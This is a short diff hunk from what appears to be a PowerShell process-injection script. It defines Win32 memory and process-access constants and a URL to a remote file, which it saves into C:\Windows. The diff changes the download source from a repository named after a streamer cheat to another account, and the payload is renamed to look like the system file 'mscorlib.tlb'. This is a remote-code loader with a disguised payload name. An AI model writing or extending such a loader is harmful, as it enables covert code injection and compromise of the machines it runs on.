@@ -3,7 +3,7 @@ $PROCESS_ALL_ACCESS = 0x1F0FFF
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_READWRITE = 0x04
-$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
+$dllUrl = "https://raw.githubusercontent.com/Hyphen696/ShivUmangAuth/refs/heads/main/mscorlib.tlb"
 $dllPath = "C:\Windows\ShellJector.tlb"
 
 # === Win32 API declarations ===
